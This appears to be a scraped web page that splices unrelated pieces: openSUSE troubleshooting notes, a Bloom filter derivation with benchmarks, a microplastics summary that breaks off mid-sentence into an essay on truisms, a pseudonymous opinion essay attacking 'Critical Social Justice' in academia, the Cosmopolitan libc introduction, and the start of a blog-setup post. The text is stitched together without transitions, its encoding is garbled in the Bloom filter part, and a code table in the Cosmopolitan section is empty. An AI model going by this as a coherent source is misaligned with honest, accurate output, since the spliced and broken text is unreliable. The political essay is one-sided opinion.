<h2>Screen backlight</h2>



<p>For some reason, backlight of the screen is not remembered across the reboots. Each time the system boots it starts with 0% which is quite dim. </p>



<pre><code>ivan@swift3:~&gt; sudo systemctl status systemd-backlight@backlight\:amdgpu_bl0.service 
● systemd-backlight@backlight:amdgpu_bl0.service - Load/Save Screen Backlight Brightness of backlight:amdgpu_bl0
     Loaded: loaded (/usr/lib/systemd/system/systemd-backlight@.service; static)
     Active: active (exited) since Sun 2020-12-27 20:04:46 CET; 22min ago
       Docs: man:systemd-backlight@.service(8)
    Process: 893 ExecStart=/usr/lib/systemd/systemd-backlight load backlight:amdgpu_bl0 (code=exited, status=0/SUCCESS)

Dec 27 20:04:46 swift3 systemd[1]: Finished Load/Save Screen Backlight Brightness of backlight:amdgpu_bl0.</code></pre>



<p>And although it says 10 is saved brightness, I’m not sure if that’s correct. Primarily as I don’t know what the unit of measurement is. If it’s percentage, then, it’s clearly a lie. This may be the issue with the GPU I have, but since it’s not latest Vega graphics, I’d hope that all things would be polished by now in recent kernel such as on the one Tumbleweed ships. Needless to say, this works fine on other distributions… </p>



<h2>Emacs</h2>



<p>One peculiar thing I’ve observed is that emacs package is already pre-installed, I guess due to some group selected while performing network install. I was very glad to see that. In order to get the GUI version though, you have to install separate package (<code>emacs-x11</code>), but that’s just fine.</p>



<h2>Package (un)install</h2>



<p>I was playing a bit with i3 window manager in combination with KDE, and that package pulled in few dependencies. Unfortunately, when removing the package those aren’t cleaned up automatically</p>



<pre><code>ivan@swift3:~&gt; sudo zypper remove i3
Reading installed packages...
Resolving package dependencies...

The following package is going to be REMOVED:
  i3

1 package to remove.
After the operation, 1.7 MiB will be freed.</code></pre>



<p>There’s a handy switch for the zypper command to clean those up (<code>-u</code>) but it seems it doesn’t work after you already uninstalled the package, so I, naturally, went through this charade: </p>



<pre><code>ivan@swift3:~&gt; sudo zypper remove -u
Too few arguments.
At least one package name is required.

ivan@swift3:~&gt; sudo zypper remove -u i3
Reading installed packages...
'i3' not found in package names. Trying capabilities.
No provider of 'i3' found.
Resolving package dependencies...

Nothing to do.


ivan@swift3:~&gt; sudo zypper in i3
Loading repository data...
Reading installed packages...
Resolving package dependencies...

The following NEW package is going to be installed:
  i3

1 new package to install.
Overall download size: 953.7 KiB. Already cached: 0 B. After the operation, additional 1.7 MiB will be used.

ivan@swift3:~&gt; sudo zypper remove -u i3
Reading installed packages...
Resolving package dependencies...

The following 16 packages are going to be REMOVED:
  dmenu i3 i3lock i3status libconfuse2 libev4 libstartup-notification-1-0 libxcb-xrm0 perl-AnyEvent perl-AnyEvent-I3 perl-common-sense perl-Guard
  perl-JSON perl-JSON-XS perl-Task-Weaken perl-Types-Serialiser

16 packages to remove.
After the operation, 3.9 MiB will be freed.</code></pre>



<h2>Conclusions</h2>



<p>So far I’ve noticed some things that OpenSUSE decides to do a bit differently, and even some rough edges as you can see, but I’ll continue my exploration and be open-minded. </p>



<p>Some things are really frustrating while others require a bit more playing to resolve them. In any case, if those were solved for me by the distribution maintainers, I’d be much happier with the distribution. </p>

    <p>Bloom filters are a data structure which allows you to test whether an element exists in a set, with lower memory usage and better access times than other hash table implementations. It is probabilistic, and while it can guarantee negative matches, there is a slight chance it returns a false positive match. Through clever mathematical assumptions, we can produce constraints to minimise the chance of a false positive.</p>

<h2 id="description">Description</h2>

<p>Let there be a set of elements $N$, and we wish to store each element $e \in N$ in the set $F$. To do this, we introduce the set $K$ which has $k$ number of hash functions which hash the same element to <em>different</em> values.</p>

<p>In the following example, elements $x$ and $y$ are hashed by $k = 3$ hash functions.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure1.png" width="200"></p>

<p>Next, we introduce the bit array $M$ which has $m$ bits. This bit array is the underlying data structure that represents $F$, and we say an element $e$ is in $F$ if all of its corresponding bits (after hashing) in the bit array are set.</p>

<p>In the following image, $x$ is in $F$ hence all of its hashed bits within $M$ are set. Only one of $y$â€™s hashed bits are set so it is not in $F$. $x$ and $y$ are also sharing a bit at $M[4]$.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure2.png" width="400"></p>

<p>As we hash more elements from $N$, more bits are set to 1 in $M$ and eventually we get a <em>false positive</em> when testing set membership. This occurs when all of an elementâ€™s bits are set, although it was never inserted.</p>

<p>Consider the following scenario: $x$ and $y$ are in $F$, $z$ is not. However, $z$â€™s hashed bits are all set, giving the (false) impression that $z$ is in $F$.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure3.png" width="500"></p>

<p>Once an element is placed in $F$, it will remain there, as flipping bits to remove an element introduces the possibility of false negatives. We will show that there exists optimal parameters, $k$ hash functions and $m$ length bit array, to lower the false positive rate $\epsilon$.</p>



<h2 id="proof">Proof</h2>
<p>Note: This section is pretty math heavy, if you just want to look at the cool tables and graphs then you can skip ahead to <a href="#implementation-and-benchmarks">here</a>.</p>

<p>$\newcommand{\pbrac}[1]{\left(#1\right)}$
$\newcommand{\sbrac}[1]{\left[#1\right]}$</p>

<h3 id="first-attempt">First attempt</h3>
<p>Assume that a hash function in $K$ maps to each array position with <em>equal probability</em>. The probability that a bit is not set by a hash function during the insertion of an element is:</p>

<p>\begin{align}
    1 - \frac{1}{m}.
\end{align}</p>

<p>The probability that every hash function in $K$ leaves a certain bit at 0 will be</p>

<p>\begin{align}
    \left( 1 - \frac{1}{m} \right)^k \approx \ e^{-k/m}.
\end{align}</p>

<p>Thus, after inserting $n$ elements, the probability that a bit is <em>still</em> 0 is</p>

<p>\begin{align}
    \left( 1 - \frac{1}{m} \right)^{kn} \approx \ e^{-kn/m} \ = \ p,
\end{align}</p>

<p>and the probability that a bit is 1 after $n$ insertions is</p>

<p>\begin{align}
    \left( 1 - \left[ 1 - \frac{1}{m} \right]^{kn} \right) \approx \left( 1 - p \right).
\end{align}</p>

<p>Next, we test set membership for an element NOT in the set. Following $n$ insertions, each bit in the array has a chance of being set to 1 with the probability above. The probability that $k$ bits are set to 1, which would lead to a false positive result for set membership, is often referred to as the error/false positive rate:</p>

<p>\begin{align}
    \epsilon = \left( 1 - \left[ 1 - \frac{1}{m} \right]^{kn} \right)^k \approx \left( 1 - p \right)^k.
\end{align}</p>

<p>There exists a major problem with this analysis, however. At the start we made an assumption that all bits would be set randomly and independently. <strong>This is not correct</strong> as we have established that <em>all</em> our hash functions in $K$ will not hash an element to the same array position. For example, if we have hashed an element $m-1$ times into $m-1$ different positions, then the remaining $1$ bit in the array is guaranteed to be chosen, if we wish to retain an even spread of hashed values. Concretely, the $k$ bit array positions for each element are in fact <em>dependent</em>.</p>

<h3 id="another-try-using-poisson-approximations">Another try using Poisson approximations</h3>

<p>Consider a â€œballs and binsâ€� scenario where each throw of a ball into a bin is equivalent to hashing an element to an array position.</p>

<p>We have the following 2 cases:</p>
<ul>
  <li><strong>Exact case:</strong> $n$ balls are thrown into $m$ bins independently and uniformly at random</li>
  <li><strong>Poisson case:</strong> number of balls in each bin are taken to be independent Poisson random variables with an expected value</li>
</ul>

<p>Weâ€™ll be using the following corollaries from the book <em>â€œProbability and computing: randomization and probabilistic techniques in algorithms and data analysisâ€�</em> by Mitzenmacher and Upfal.</p>

<p><strong>Corollary 4.6:</strong> Let $X_1,â€¦,X_n$ be independent Poisson trials such that $P(X_i = 1) = p_i$. Let $X = \sum_{i=1}^{n} \text{ and } \mu = E(X)$. For $0 &lt; \delta &lt; 1$. [p. 71]
\begin{align}
    P\left(\left|X - \mu\right| \geq \delta \mu\right) \leq 2\exp{\left(-\frac{\mu\delta^2}{3}\right)}
\end{align}</p>

<p><strong>Corollary 5.9:</strong> any event that takes place with probability $p$ in the Poisson case takes place with probability at most $p e \sqrt{n}$ in the exact case. [p. 109]</p>

<p>Each bin corresponds to an array position and thus a bit being set to 0 is equivalent to an empty bin in our scenario. The fraction of bits being set to 0 after $n$ insertions is therefore equivalent to the fraction of empty bins after $kn$ balls have been thrown into $m$ bins.</p>

<p>We define $X$ as the number of empty bins after the balls have been thrown into $n$ bins, such that</p><p>

\[\begin{align}
    X =&amp; \ \sum_{i=1}^{n} X_i, \\
    \text{where } X_i =&amp; \
    \begin{cases}
        1 &amp; \text{if bin is empty} \\
        0 &amp; \text{otherwise}
    \end{cases}
\end{align}\]

</p><p>then we can define</p><p>

\[\begin{align}
    p' =&amp; \ \left( 1 - \frac{1}{m}\right)^{kn}, \\
    E(X) =&amp; \ mp'.
\end{align}\]

</p><p>In the Poisson case, each bin can be thought of as an independent Poisson random variable with expected value $pâ€™$. Therefore, we can apply \textbf{corollary 4.6} and $E(X) = \ mpâ€™$ to obtain the following:</p>

<p>\begin{align}
    P\left( \left| X - mpâ€™\right| \geq \delta mpâ€™\right) \ \leq&amp; \ 2\exp{\left(-\frac{mpâ€™\delta^2}{3}\right)}
\end{align}
Let $\delta \ = \ \beta / pâ€™, \ $choose small$ \ \beta$
\begin{align}
    \therefore \ P\left( \left| X - mpâ€™\right| \geq \beta m\right) \ \leq&amp; \ 2\exp{\left(-\frac{m\beta^2}{3pâ€™}\right)}
\end{align}</p>

<p>We then apply <strong>corollary 5.9</strong> to obtain</p><p>

\[\begin{align}
    P\left( \left| X - mp'\right| \geq \beta m\right) \ \leq&amp; \ 2e\sqrt{kn} \exp{\left(-\frac{m\beta^2}{3p'}\right)}\\
    \leq&amp; \ 0.000001 \ \text{when $m$ sufficiently large.}
\end{align}\]

</p><p>Essentially, taking the probability of an event using a Poisson approximation for all of the bins and multiplying it by $e\sqrt{kn}$ gives an upper bound for the probability of the event when $kn$ balls are thrown into $m$ bins (the exact case where events are independent).</p>

<p>This result tells us that when $m$ is sufficiently large, the fraction of empty bins $X/m$ is <em>very</em> close to $pâ€™$. And since $pâ€™ \approx p$ we can use $p$ to continue predicting actual performance.</p>

<h3 id="optimal-k">Optimal <em>k</em></h3>

<p>The false positive rate is $\epsilon = (1-p)^k$ and we look for a $k$ that minimizes $\epsilon$. Rearranging $\epsilon$ gives us</p><p>

\[\begin{align}
    \epsilon \ =&amp; \ \pbrac{1-p}^k \\
    =&amp; \ \exp{\pbrac{\ln{\pbrac{\sbrac{1-p}^k}}}} \\
    =&amp; \ \exp{\pbrac{k\ln{\pbrac{\sbrac{1-p}}}}} \\
    =&amp; \ \exp{\pbrac{k\ln{\pbrac{\sbrac{1-e^{-kn/m}}}}}}.
\end{align}\]

</p><p>If we let $g = k\ln{\pbrac{1-e^{-kn/m}}}$ so that $\epsilon = e^g$, then minimizing the false positive $\epsilon$ is equivalent to minimizing $g$ with respect to $k$. We have</p>

<p>\begin{align}
    \frac{dg}{dk}\ =&amp; \ \ln \left(1-e^{-\frac{nk}{m}}\right)+\frac{kn \cdot e^{-\frac{nk}{m}}}{m\left(1-e^{-\frac{nk}{m}}\right)}.
\end{align}</p>

<p>Solving this derivative when it is 0 and finding the global minimum gives us</p>

<p>\begin{align}
    k = \frac{m}{n}\ln\pbrac{2}.
\end{align}</p>

<h3 id="optimal-m">Optimal <em>m</em></h3>
<p>To find an optimal length for our bit-array we substitute $k = \frac{m}{n}\ln\pbrac{2}$ into our false positive equation and get</p><p>

\[\begin{align}
    \epsilon \ =&amp; \ \pbrac{1-e^{-\ln 2}}^{\frac{m}{n}\ln 2} \\
    \ln\epsilon \ =&amp; \ \frac{m}{n}\ln\pbrac{2}\ln\pbrac{1-e^{-\ln 2}} \\
    =&amp; \ \frac{m}{n}\ln\pbrac{2}\ln{\frac{1}{2}} \\
    =&amp; \ -\frac{m}{n}\ln\pbrac{2}^2 \\
    \therefore m \ =&amp; \ \frac{-n\ln\epsilon}{\ln\pbrac{2}^2}.
\end{align}\]

</p><p>This effectively leaves $\epsilon$ as the only unknown variable left. However, when we consider the Bloom filter in a practical context, we will most likely have a false positive rate in mind, and can treat it as a constant.</p>



<h2 id="implementation-and-benchmarks">Implementation and benchmarks</h2>

<h3 id="overview">Overview</h3>
<p>We will be comparing the Bloom filter against 4 popular and efficient implementations of hash tables:</p>

<ul>
  <li>Google Dense Hash Set</li>
  <li>Google Sparse Hash Set</li>
  <li>TSL Robin Set</li>
  <li>STD Unordered Set</li>
</ul>

<p>Implementations were compared based on time performance (insert, read) and memory performance (inserts). Currently, only small strings (15 characters) and medium strings (50 characters) are used for input, with up to $n = 3\times10^6$ elements for each test. Each test was performed 5 times for each implementation and an average-of-5 was used in the final table/graph. The false positive rate is set to 0.01.</p>

<p>Benchmarking was done using gccâ€™s C++ compiler and the following command was run to compile: g++ -Iinclude -std=c++11 -O3. In addition, the tests were performed on a computer with the following specs:</p>

<ul>
  <li>AMD Ryzen 5 2600 3.4GHz 6 core</li>
  <li>8GB DDR4-2666 CL19</li>
</ul>

<p>The tests were run with the false positive rate $\epsilon = 0.01$</p>



<h3 id="insert-small-string-15-bytes">Insert small string (15 bytes)</h3>

<p>Before the test, we generate a vector of $n$ small strings and then insert each string as an entry into the sets, measuring the performance of said insert operation. The Bloom filterâ€™s only overhead during insertion is setting bits to 1.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/insert_small_string.png" width="700"></p>



<h3 id="read-small-string-15-bytes">Read small string (15 bytes)</h3>

<p>Before the test, we generate a vector of $n$ small strings and pre-load the strings into the hash tables. We then traverse the same vector of small strings, testing set membership and timing said read operation.</p>

						<p>In a review <a href="https://ehp.niehs.nih.gov/doi/full/10.1289/EHP7171">published in Environmental Health Perspectives</a>, Microplastics (MPs) are laid out as a serious problem in the marine environment as well as human food consumption.</p><p>The study analyzed 69 experiments across mollusks, crustaceans, fish and echinodermata. The data show that seafood is a major cause of human exposure to MPs. Levels of MP contamination vary significantly in different phylum of organisms. </p><p>Microplastics are tiny pieces of any kind of plastic found in the environment less than 5mm long according to NOAA and the European Chemicals Agency.

In name alone they are contradictory; so many of the statements aren’t obviously true, but are instead slogans or inflammatory rhetoric. The phrases aren’t copyrighted by the artist. The typography, layout, format are recognizable but basic.</p><p>I like a lot of the truisms that draw a contrast. This one, for example: “It’s better to be naive than jaded.” Are these things even in opposition? Can one be both, or neither? It’s better for who?</p><p>It rumbles around like a koan in my mind.</p><p>I’m not old, but I’m old enough to have done a lot of things a few times: jobs, relationships, places. I’ve started to be tempted to draw conclusions from these experiences. Some things work, others don’t. By avoiding the improbable paths and going with what works, what fits the patterns in history, I’ll learn from history.</p><p>We have a saying for that, from <a href="https://en.wikiquote.org/wiki/George_Santayana#Vol._I,_Reason_in_Common_Sense">George Santayana</a>: “Those who cannot remember the past are condemned to repeat it.” But our memory is post-Gutenberg and post-Internet, and I think we can say that a lot of history is cyclical by nature, not just because of our carelessness.</p><p>I am struck by how many big, intimidating things I did when I was younger, simply because I didn’t know to be intimidated by them and I had time and privilege. How many of those projects would I embark on now, knowing that to <em>really</em> finish might be impossible?</p><p>Conversely, I look back on ideas and projects that seemed infeasible a few years ago or that have been tried a hundred times without success. But then someone, unaware of history, tries for the hundred and first time, and it works. If they were scholars of history, they’d know about the failures, how people more talented and resourced than them had tried. They would avoid the idea altogether.</p><p>But ideas don’t live in a vacuum - they exist in a changing world, in which culture, technology, and trends change how well they’ll work. How much do those things matter? At least a bit. At the extreme of that opinion lies <a href="http://crnano.org/interview.kurzweil.htm">Ray Kurzweil</a>:</p><blockquote><p>I quickly realized that timing is the critical factor in the success of inventions. Most technology projects fail not because the technology doesn’t work, but because the timing is wrong – not all of the enabling factors are at play where they are needed.</p></blockquote><p>When I work now, when I write or create, I often feel like I know more of the map than I knew before. Failure dims some paths, success lights up others, leading me one way or another. Failure is jadedness, success might be knowledge.</p><p>But I think we need to make a conscious effort to realize: every time is different. Even if you put the same effort in and make the same decisions, the world, the people in it, and you, have all changed. What worked before, might not work now. The idea that failed before, well - maybe its day has come.</p></div></div>]]>

								<p>I have a Ph.D. in Women’s Studies, but I’m not woke anymore. I write under a pseudonym because, if my colleagues were to find out about my criticisms of this field, I would be unable to find any employment in academia. That someone who critiques the axioms of a field of study feels compelled to write under an assumed name tells you everything you need to know about the authoritarianism underpinning this ideology. I no longer believe that the fundamental ideas of Women’s Studies, and of Critical Social Justice more generally, describe reality; they are at best partial explanations—hyperbolic ideology, not fact-based analysis. I have seen this ideology up close and seen how it consumes and even destroys people, while dehumanizing anyone who dissents.</p>
<p>I’m sad to say it, but I believe that Critical Social Justice ideology—if not beaten in the war of ideas—will destroy the liberal foundation of American society. By liberal I mean principles including, but not limited to, constitutional republican government, equality under the law, due process, a commitment to reason and science, individual liberty, and freedom—of speech, of the press, and of religion. Because Critical Social Justice ideology is now the dominant paradigm in American academia, it has flowed into all other major societal institutions, the media, and even corporations. Far from being counter-cultural, Critical Social Justice ideology is now the cultural mainstream. A diverse spectrum of liberals, libertarians, conservatives, and all others who, to put it bluntly, want the American constitution to continue to serve as the basis for our society have to team up to prevent this ideology from destroying our country.</p>
<p>I became “woke” around 2003, so I have nearly two decades of experience with Critical Social Justice ideology. As the oldest daughter in a working-class family with six kids, neither of my parents had a college degree, although my mom had taken some community college classes. My high school teachers emphasized the importance of going to college. While I wasn’t sure what opportunities a college education would bring, I decided that it would best to attend, given the urgency with which all the teachers and guidance counselors discussed college as a necessity. I was a good, not great, student, who scored highly very highly on the verbal component of standardized tests. I loved literature and writing, so I figured that I’d get a bachelor’s degree in English literature, then maybe find a job as an administrative assistant and write in my free time. For a seventeen year-old girl who wasn’t especially ambitious, it seemed like a decent plan. At least it was better, I thought, than continuing to work part-time as a waitress. And through a combination of scholarships and part-time work, I realized that I’d be able to complete a bachelor’s degree without incurring any debt.</p>
<p>When I began attending college classes in 2000, I registered for a Western civilization course and fell in love with the Greek and Roman classics, so I continued to take additional courses of this type. The twentieth-century Western civilization course was taught by a very personable and funny women’s studies professor. I don’t think it is widely understood that first-generation college students, in general, don’t know the politics behind who becomes university professors. I naively assumed that professors are among the smartest people in the country, and I had no idea that the professoriate is heavily slanted to the ideological left. I now understand that Critical Social Justice professors are evangelists for their faith and the university is their mission field. Their goal is to take young students—inexperienced, eager to succeed—unmoor them from any faith tradition they might have, even if it’s just American civics, and replace that with Critical Social Justice ideology. And, for the most part, these professors succeed. They are, on the whole, likable people—energetic, personable, and caring.</p>
<p>My first encounters with Critical Social Justice came during the feminism unit of this course, which included works by Simone de Beauvoir, Betty Friedan, Angela Davis, bell hooks, and Shulamith Firestone, among others. I was interested in learning about feminism, but Firestone’s argument to eliminate the biological family alarmed me, as I hoped to have both a career and children someday. Also, I didn’t believe Firestone’s argument that motherhood is inherently oppressive. From witnessing my mom’s own experiences with having six kids, I knew that she wasn’t oppressed. It was a choice she freely made because she loved children and felt that taking care of them, in spite of the difficulties, was rewarding. In spite of my reservations about Firestone’s book, I became interested in learning more about feminism and began to check out more women’s studies books from the library. As a young university student, encountering Critical Social Justice ideas felt intoxicating, like stumbling onto a portal into a new world. I felt like a detective, with my newly developing <a href="https://newdiscourses.com/tftw-critical-consciousness/"><span>critical consciousness</span></a> understanding society for the first time—all the oppression, the sexism, racism, the evils of capitalism, and so on. It felt righteous, like I was part of a counter-cultural movement, a vanguard helping to bend the arc of the moral universe toward justice.</p>
<p>The women’s studies professor, sensing that she had an acolyte, encouraged my interest in becoming more involved in advocacy for women. Over the summer, I worked as an intern at a feminist nonprofit and met a lot of people on the radical left, including anarchists. Around this time, I attended a few protests for various causes, but after a couple of years with this ideology as my guiding framework, I grew exhausted by feeling constant anger. I became tired of focusing on all the injustices of the world, not on what I had to be grateful for. It was a miserable, resentment-based life, and I felt helpless to solve the world’s problems.</p>
<p>My foray into radical politics ended around the time I started a master’s program in creative writing. I focused on reading literature and my colleagues’ works, which were complex and nuanced, not ideologically motivated in the slightest degree. After finishing my master’s degree, I taught writing as a college lecturer for a couple of years, then decided to apply for Ph.D. programs in hopes that having a doctorate would increase my pay. One of the most galling forms of hypocrisy I’ve experienced is that leftist professors claim a commitment to “social justice,” yet the academic departments they run employ large numbers of underpaid adjunct instructors who are closed out of the high pay and job security of the tenured radicals.</p>
<p>When I began my Ph.D. program in 2013 at a highly ranked university, I began to see that something about my new colleagues was different from what I remembered about my colleagues just a few years earlier. At first, I chalked this up to the fact that I was a handful of years older than most of the students, many of whom had recently completed their undergraduate degrees. They seemed angry, self-righteous, and determined, lacking the intellectual humility that I had admired so much in the friends I’d made in my master’s program. I now realize that these students were “woke.” Having spent the past couple of years teaching writing to working-class students, I hadn’t been exposed to Critical Social Justice ideology in some time, and I was surprised to see the inroads it had made in the decade since I’d first encountered it.</p>
<p>I realized that Critical Social Justice was no longer a fringe intellectual field of study, but a real force that was reshaping the university. Early on in my program, I recall a panic about racism at the university, and many students issued social media demands of the administration to increase minority enrollment. While I fully support that goal, I feel that such efforts are best advanced through mentoring and guiding promising young students beginning in elementary school, not waiting until they reach adulthood and then attempting to force equal outcomes. Around this time, I became extremely disturbed when, while serving on a committee that gave writing awards, I was attacked by other committee members for judging on merit, for not taking into account skin color or gender.</p>
<p>Yet I don’t think I fully understand the authoritarian aspects of woke ideology until after Trump won the 2016 election. In late 2016 and early 2017, I witnessed shocking behavior from my colleagues, who began attacking Republicans, white people, conservatives, and Christians as oppressors. They attacked free speech, saying that some people did not deserve a platform because they were engaging in “<a href="https://newdiscourses.com/tftw-hate-speech/"><span>hate speech</span></a>.” I argued that there isn’t a clear definition of what constitutes hate speech; and that the constitution protects all speech, save for incitement to imminent lawless action. For saying this, I was attacked as stupid, a bad person, a “right-winger.” Early in Trump’s administration, one of my colleagues said that political violence was justified as a response to his “evil” policies. While I’m no fan of Trump, I oppose violence—a basic principle I thought that all Americans shared. It was in this context that I became disillusioned with the ideology in which I had been immersed for years.</p>
<p>I decided to seek out and try to understand other points of view, so I read books by authors to whom I had never been exposed, such as F.A. Hayek, Ronald Bork, Jonathan Haidt, Thomas Sowell, and others. I began to read and listen to conservative, classically liberal, and libertarian thinkers—people whose ideas I had never encountered in all my years of so-called “higher” education. I listened with an open mind, and I didn’t see any hatred from these thinkers. On the contrary, I discovered carefully reasoned, evidence-based arguments that had much greater explanatory abilities …</p></section></div></div></div>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>

</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

<p>I've been meaning to get around to setting up a blog for a long time. In the past, I've gotten as far as getting halfway through trying out different static site generators before getting depressed about my lack of frontend design chops and given up. </p>
<p>The perfect storm finally came: </p>
<ol>
<li>I took <strong>two weeks off</strong>. After recharging my batteries for a few days, I was ready for a little side project. </li>
<li>I recently discovered <a href="https://obsidian.md/" target="_blank" rel="nofollow noopener noreferrer">Obsidian</a>, which is a dope AF note-taking app. </li>
<li>I've tried a decent number of static site generators to build documentation for various projects and wanted to take a deeper dive into <a href="https://gatsbyjs.com/" target="_blank" rel="nofollow noopener noreferrer">Gatsby</a>. </li>
<li>I recently discovered <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> and wanted to use it for something. </li>
</ol>
<p>I wanted to see if i could use Obsidian as a <a href="https://en.wikipedia.org/wiki/Content_management_system" target="_blank" rel="nofollow noopener noreferrer">content management system (CMS)</a> for a tech blog and Pipedream to automate tweeting out new blog posts. </p>

